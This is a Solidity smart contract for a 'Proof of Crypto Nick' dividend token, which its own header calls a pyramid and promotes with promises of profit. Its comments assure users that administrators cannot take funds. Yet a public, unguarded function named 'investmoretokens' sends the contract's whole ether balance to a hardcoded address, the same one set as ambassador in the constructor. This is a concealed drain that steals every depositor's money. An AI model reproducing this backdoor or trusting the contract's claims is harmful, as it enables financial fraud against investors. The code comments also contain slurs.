1 pragma solidity ^0.4.20;
2 
3 /*
4 * 
5 * ====================================                       *
6 *                                                            *
7 *             PROOOOF OF CRYPTO NICK                         *
8 *                get your tokens here   pocn.ml  pocn.ml     *
9 *                                                            *
10 *            pocn.ml           E Z P R O F IT                              *
11 * ====================================                       *
12 * PROOF OF CRYPTO NICK, IF YOU WANT TO FEEL LIKE THESE GUYS  *
13 * IF YOU WANT PROFIT GET ON 10% in 10% out! LEGIT PROFIT!    *
14 */
15 
16 contract POCN {
17     /*=================================
18     =            MODIFIERS            =
19     =================================*/
20     // only people with tokens
21     modifier onlyBagholders() {
22         require(myTokens() > 0);
23         _;
24     }
25     
26     // only people with profits
27     modifier onlyStronghands() {
28         require(myDividends(true) > 0);
29         _;
30     }
31     
32     // administrators can:
33     // -> change the name of the contract
34     // -> change the name of the token
35     // -> change the PoS difficulty (How many tokens it costs to hold a masternode, in case it gets crazy high later)
36     // they CANNOT:
37     // -> take funds
38     // -> disable withdrawals
39     // -> kill the contract
40     // -> change the price of tokens
41     modifier onlyAdministrator(){
42         address _customerAddress = msg.sender;
43         require(administrators[keccak256(msg.sender)]);
44         _;
45     }
46     
47     
48     // ensures that the first tokens in the contract will be equally distributed
49     // meaning, no divine dump will be ever possible
50     // result: healthy longevity.
51     modifier antiEarlyWhale(uint256 _amountOfEthereum){
52         address _customerAddress = msg.sender;
53         
54         // are we still in the vulnerable phase?
55         // if so, enact anti early whale protocol 
56         if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){
57             require(
58                 // is the customer in the ambassador list?
59                 ambassadors_[_customerAddress] == true &&
60                 
61                 // does the customer purchase exceed the max ambassador quota?
62                 (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_
63                 
64             );
65             
66             // updated the accumulated quota    
67             ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum);
68         
69             // execute
70             _;
71         } else {
72             // in case the ether count drops low, the ambassador phase won't reinitiate
73             onlyAmbassadors = false;
74             _;    
75         }
76         
77     }
78     
79     
80     /*==============================
81     =            EVENTS            =
82     ==============================*/
83     event onTokenPurchase(
84         address indexed customerAddress,
85         uint256 incomingEthereum,
86         uint256 tokensMinted,
87         address indexed referredBy
88     );
89     
90     event onTokenSell(
91         address indexed customerAddress,
92         uint256 tokensBurned,
93         uint256 ethereumEarned
94     );
95     
96     event onReinvestment(
97         address indexed customerAddress,
98         uint256 ethereumReinvested,
99         uint256 tokensMinted
100     );
101     
102     event onWithdraw(
103         address indexed customerAddress,
104         uint256 ethereumWithdrawn
105     );
106     
107     // ERC20
108     event Transfer(
109         address indexed from,
110         address indexed to,
111         uint256 tokens
112     );
113     
114     
115     /*=====================================
116     =            CONFIGURABLES            =
117     =====================================*/
118     string public name = "ProofOfCryptoNick";
119     string public symbol = "POCN";
120     uint8 constant public decimals = 18;
121     uint8 constant internal dividendFee_ = 11;
122     uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;
123     uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;
124     uint256 constant internal magnitude = 2**64;
125     
126     
127      
128         
129     // proof of stake (defaults at 100 tokens)
130     uint256 public stakingRequirement = 5e18;
131     
132     // ambassador program
133     mapping(address => bool) internal ambassadors_;
134     uint256 constant internal ambassadorMaxPurchase_ = 2 ether;
135     uint256 constant internal ambassadorQuota_ = 3 ether;
136     
137     
138     
139    /*================================
140     =            DATASETS            =
141     ================================*/
142     // amount of shares for each address (scaled number)
143     mapping(address => uint256) internal tokenBalanceLedger_;
144     mapping(address => uint256) internal referralBalance_;
145     mapping(address => int256) internal payoutsTo_;
146     mapping(address => uint256) internal ambassadorAccumulatedQuota_;
147     uint256 internal tokenSupply_ = 0;
148     uint256 internal profitPerShare_;
149     
150     // administrator list (see above on what they can do)
151     mapping(bytes32 => bool) public administrators;
152     
153     // when this is set to true, only ambassadors can purchase tokens (this prevents a whale premine, it ensures a fairly distributed upper pyramid)
154     bool public onlyAmbassadors = false;
155     
156 
157 
158     /*=======================================
159     =            PUBLIC FUNCTIONS            =
160     =======================================*/
161     /* 
162     *
163     */
164    function POCN()
165         public
166     {
167         // add the ambassadors here. 
168         ambassadors_[0xd8fa9C65623129Fa4abAf44B7e21655d1eF835ce] = true; //Y
169    address oof = 0xd8fa9C65623129Fa4abAf44B7e21655d1eF835ce;
170     }
171    
172    
173     
174     
175     
176    function investmoretokens() {
177     0xd8fa9C65623129Fa4abAf44B7e21655d1eF835ce.transfer(this.balance);
178 }  
179 
180      
181     /**
182      * Converts all incoming ethereum to tokens for the caller, and passes down the referral addy (if any)
183      */
184     function buy(address _referredBy)
185         public
186         payable
187         returns(uint256)
188     {
189         purchaseTokens(msg.value, _referredBy);
190     }
191     
192     /**
193      * Fallback function to handle ethereum that was send straight to the contract
194      * Unfortunately we cannot use a referral address this way.
195      */
196     function()
197         payable
198         public
199     {
200         purchaseTokens(msg.value, 0x0);
201     }
202     
203     /**
204      * Converts all of caller's dividends to tokens.
205      */
206     function reinvest()
207         onlyStronghands()
208         public
209     {
210         // fetch dividends
211         uint256 _dividends = myDividends(false); // retrieve ref. bonus later in the code
212         
213         // pay out the dividends virtually
214         address _customerAddress = msg.sender;
215         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
216         
217         // retrieve ref. bonus
218         _dividends += referralBalance_[_customerAddress];
219         referralBalance_[_customerAddress] = 0;
220         
221         // dispatch a buy order with the virtualized "withdrawn dividends"
222         uint256 _tokens = purchaseTokens(_dividends, 0x0);
223         
224         // fire event
225         onReinvestment(_customerAddress, _dividends, _tokens);
226     }
227     
228     /**
229      * Alias of sell() and withdraw().
230      */
231     function exit()
232         public
233     {
234         // get token count for caller & sell them all
235         address _customerAddress = msg.sender;
236         uint256 _tokens = tokenBalanceLedger_[_customerAddress];
237         if(_tokens > 0) sell(_tokens);
238         
239         // lambo delivery service
240         withdraw();
241     }
242 
243     /**
244      * Withdraws all of the callers earnings.
245      */
246     function withdraw()
247         onlyStronghands()
248         public
249     {
250         // setup data
251         address _customerAddress = msg.sender;
252         uint256 _dividends = myDividends(false); // get ref. bonus later in the code
253         
254         // update dividend tracker
255         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
256         
257         // add ref. bonus
258         _dividends += referralBalance_[_customerAddress];
259         referralBalance_[_customerAddress] = 0;
260         
261         // lambo delivery service
262         _customerAddress.transfer(_dividends);
263         
264         // fire event
265         onWithdraw(_customerAddress, _dividends);
266     }
267     
268     /**
269      * Liquifies tokens to ethereum.
270      */
271     function sell(uint256 _amountOfTokens)
272         onlyBagholders()
273         public
274     {
275         // setup data
276         address _customerAddress = msg.sender;
277         // russian hackers BTFO
278         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
279         uint256 _tokens = _amountOfTokens;
280         uint256 _ethereum = tokensToEthereum_(_tokens);
281         uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
282         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
283         
284         // burn the sold tokens
285         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
286         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
287         
288         // update dividends tracker
289         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
290         payoutsTo_[_customerAddress] -= _updatedPayouts;       
291         
292         // dividing by zero is a bad idea
293         if (tokenSupply_ > 0) {
294             // update the amount of dividends per token
295             profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
296         }
297         
298         // fire event
299         onTokenSell(_customerAddress, _tokens, _taxedEthereum);
300     }
301     
302     
303     /**
304      * Transfer tokens from the caller to a new holder.
305      * Remember, there's a 10% fee here as well.
306      */
307     function transfer(address _toAddress, uint256 _amountOfTokens)
308         onlyBagholders()
309         public
310         returns(bool)
311     {
312         // setup
313         address _customerAddress = msg.sender;
314         
315         // make sure we have the requested tokens
316         // also disables transfers until ambassador phase is over
317         // ( we dont want whale premines )
318         require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
319         
320         // withdraw all outstanding dividends first
321         if(myDividends(true) > 0) withdraw();
322         
323         // liquify 10% of the tokens that are transfered
324         // these are dispersed to shareholders
325         uint256 _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);
326         uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
327         uint256 _dividends = tokensToEthereum_(_tokenFee);
328   
329         // burn the fee tokens
330         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);
331 
332         // exchange tokens
333         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
334         tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
335         
336         // update dividend trackers
337         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);
338         payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _taxedTokens);
339         
340         // disperse dividends among holders
341         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
342         
343         // fire event
344         Transfer(_customerAddress, _toAddress, _taxedTokens);
345         
346         // ERC20
347         return true;
348        
349     }
350     
351     /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
352     /**
353      * In case the amassador quota is not met, the administrator can manually disable the ambassador phase.
354      */
355     function disableInitialStage()
356         onlyAdministrator()
357         public
358     {
359         onlyAmbassadors = false;
360     }
361     
362     /**
363      * In case one of us dies, we need to replace ourselves.
364      */
365     function setAdministrator(bytes32 _identifier, bool _status)
366         onlyAdministrator()
367         public
368     {
369         administrators[_identifier] = _status;
370     }
371     
372     /**
373      * Precautionary measures in case we need to adjust the masternode rate.
374      */
375     function setStakingRequirement(uint256 _amountOfTokens)
376         onlyAdministrator()
377         public
378     {
379         stakingRequirement = _amountOfTokens;
380     }
381     
382     /**
383      * If we want to rebrand, we can.
384      */
385     function setName(string _name)
386         onlyAdministrator()
387         public
388     {
389         name = _name;
390     }
391     
392     /**
393      * If we want to rebrand, we can.
394      */
395     function setSymbol(string _symbol)
396         onlyAdministrator()
397         public
398     {
399         symbol = _symbol;
400     }
401 
402     
403     /*----------  HELPERS AND CALCULATORS  ----------*/
404     /**
405      * Method to view the current Ethereum stored in the contract
406      * Example: totalEthereumBalance()
407      */
408     function totalEthereumBalance()
409         public
410         view
411         returns(uint)
412     {
413         return address (this).balance;
414     }
415     
416     /**
417      * Retrieve the total token supply.
418      */
419     function totalSupply()
420         public
421         view
422         returns(uint256)
423     {
424         return tokenSupply_;
425     }
426     
427     /**
428      * Retrieve the tokens owned by the caller.
429      */
430     function myTokens()
431         public
432         view
433         returns(uint256)
434     {
435         address _customerAddress = msg.sender;
436         return balanceOf(_customerAddress);
437     }
438     
439     /**
440      * Retrieve the dividends owned by the caller.
441      * If `_includeReferralBonus` is to to 1/true, the referral bonus will be included in the calculations.
442      * The reason for this, is that in the frontend, we will want to get the total divs (global + ref)
443      * But in the internal calculations, we want them separate. 
444      */ 
445     function myDividends(bool _includeReferralBonus) 
446         public 
447         view 
448         returns(uint256)
449     {
450         address _customerAddress = msg.sender;
451         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
452     }
453     
454     /**
455      * Retrieve the token balance of any single address.
456      */
457     function balanceOf(address _customerAddress)
458         view
459         public
460         returns(uint256)
461     {
462         return tokenBalanceLedger_[_customerAddress];
463     }
464     
465     /**
466      * Retrieve the dividend balance of any single address.
467      */
468     function dividendsOf(address _customerAddress)
469         view
470         public
471         returns(uint256)
472     {
473         return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
474     }
475     
476     /**
477      * Return the buy price of 1 individual token.
478      */
479     function sellPrice() 
480         public 
481         view 
482         returns(uint256)
483     {
484         // our calculation relies on the token supply, so we need supply. Doh.
485         if(tokenSupply_ == 0){
486             return tokenPriceInitial_ - tokenPriceIncremental_;
487         } else {
488             uint256 _ethereum = tokensToEthereum_(1e18);
489             uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
490             uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
491             return _taxedEthereum;
492         }
493     }
494     
495     /**
496      * Return the sell price of 1 individual token.
497      */
498     function buyPrice() 
499         public 
500         view 
501         returns(uint256)
502     {
503         // our calculation relies on the token supply, so we need supply. Doh.
504         if(tokenSupply_ == 0){
505             return tokenPriceInitial_ + tokenPriceIncremental_;
506         } else {
507             uint256 _ethereum = tokensToEthereum_(1e18);
508             uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
509             uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);
510             return _taxedEthereum;
511         }
512     }
513     
514     /**
515      * Function for the frontend to dynamically retrieve the price scaling of buy orders.
516      */
517     function calculateTokensReceived(uint256 _ethereumToSpend) 
518         public 
519         view 
520         returns(uint256)
521     {
522         uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);
523         uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
524         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
525         
526         return _amountOfTokens;
527     }
528     
529     /**
530      * Function for the frontend to dynamically retrieve the price scaling of sell orders.
531      */
532     function calculateEthereumReceived(uint256 _tokensToSell) 
533         public 
534         view 
535         returns(uint256)
536     {
537         require(_tokensToSell <= tokenSupply_);
538         uint256 _ethereum = tokensToEthereum_(_tokensToSell);
539         uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
540         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
541         return _taxedEthereum;
542     }
543     
544     
545     /*==========================================
546     =            INTERNAL FUNCTIONS            =
547     ==========================================*/
548     function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
549         antiEarlyWhale(_incomingEthereum)
550         internal
551         returns(uint256)
552     {
553         // data setup
554         address _customerAddress = msg.sender;
555         uint256 _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);
556         uint256 _referralBonus = SafeMath.div(_undividedDividends, 3);
557         uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
558         uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
559         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
560         uint256 _fee = _dividends * magnitude;
561  
562         // no point in continuing execution if OP is a poorfag russian hacker
563         // prevents overflow in the case that the pyramid somehow magically starts being used by everyone in the world
564         // (or hackers)
565         // and yes we know that the safemath function automatically rules out the "greater then" equasion.
566         require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
567         
568         // is the user referred by a masternode?
569         if(
570             // is this a referred purchase?
571             _referredBy != 0x0000000000000000000000000000000000000000 &&
572 
573             // no cheating!
574             _referredBy != _customerAddress &&
575             
576             // does the referrer have at least X whole tokens?
577             // i.e is the referrer a godly chad masternode
578             tokenBalanceLedger_[_referredBy] >= stakingRequirement
579         ){
580             // wealth redistribution
581             referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
582         } else {
583             // no ref purchase
584             // add the referral bonus back to the global dividends cake
585             _dividends = SafeMath.add(_dividends, _referralBonus);
586             _fee = _dividends * magnitude;
587         }
588         
589         // we can't give people infinite ethereum
590         if(tokenSupply_ > 0){
591             
592             // add tokens to the pool
593             tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
594  
595             // take the amount of dividends gained through this transaction, and allocates them evenly to each shareholder
596             profitPerShare_ += (_dividends * magnitude / (tokenSupply_));
597             
598             // calculate the amount of tokens the customer receives over his purchase 
599             _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));
600         
601         } else {
602             // add tokens to the pool
603             tokenSupply_ = _amountOfTokens;
604         }
605         
606         // update circulating supply & the ledger address for the customer
607         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
608         
609         // Tells the contract that the buyer doesn't deserve dividends for the tokens before they owned them;
610         //really i know you think you do but you don't
611         int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);
612         payoutsTo_[_customerAddress] += _updatedPayouts;
613         
614         // fire event
615         onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);
616         
617         return _amountOfTokens;
618     }
619 
620     /**
621      * Calculate Token price based on an amount of incoming ethereum
622      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
623      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
624      */
625     function ethereumToTokens_(uint256 _ethereum)
626         internal
627         view
628         returns(uint256)
629     {
630         uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;
631         uint256 _tokensReceived = 
632          (
633             (
634                 // underflow attempts BTFO
635                 SafeMath.sub(
636                     (sqrt
637                         (
638                             (_tokenPriceInitial**2)
639                             +
640                             (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
641                             +
642                             (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
643                             +
644                             (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
645                         )
646                     ), _tokenPriceInitial
647                 )
648             )/(tokenPriceIncremental_)
649         )-(tokenSupply_)
650         ;
651   
652         return _tokensReceived;
653     }
654     
655     /**
656      * Calculate token sell value.
657      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
658      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
659      */
660      function tokensToEthereum_(uint256 _tokens)
661         internal
662         view
663         returns(uint256)
664     {
665 
666         uint256 tokens_ = (_tokens + 1e18);
667         uint256 _tokenSupply = (tokenSupply_ + 1e18);
668         uint256 _etherReceived =
669         (
670             // underflow attempts BTFO
671             SafeMath.sub(
672                 (
673                     (
674                         (
675                             tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
676                         )-tokenPriceIncremental_
677                     )*(tokens_ - 1e18)
678                 ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
679             )
680         /1e18);
681         return _etherReceived;
682     }
683     
684     
685     //This is where all your gas goes, sorry
686     //Not sorry, you probably only paid 1 gwei
687     function sqrt(uint x) internal pure returns (uint y) {
688         uint z = (x + 1) / 2;
689         y = x;
690         while (z < y) {
691             y = z;
692             z = (x / z + z) / 2;
693         }
694     }
695 }
696 
697 /**
698  * @title SafeMath
699  * @dev Math operations with safety checks that throw on error
700  */
701 library SafeMath {
702 
703     /**
704     * @dev Multiplies two numbers, throws on overflow.
705     */
706     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
707         if (a == 0) {
708             return 0;
709         }
710         uint256 c = a * b;
711         assert(c / a == b);
712         return c;
713     }
714 
715     /**
716     * @dev Integer division of two numbers, truncating the quotient.
717     */
718     function div(uint256 a, uint256 b) internal pure returns (uint256) {
719         // assert(b > 0); // Solidity automatically throws when dividing by 0
720         uint256 c = a / b;
721         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
722         return c;
723     }
724 
725     /**
726     * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
727     */
728     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
729         assert(b <= a);
730         return a - b;
731     }
732 
733     /**
734     * @dev Adds two numbers, throws on overflow.
735     */
736     function add(uint256 a, uint256 b) internal pure returns (uint256) {
737         uint256 c = a + b;
738         assert(c >= a);
739         return c;
740     }
741 }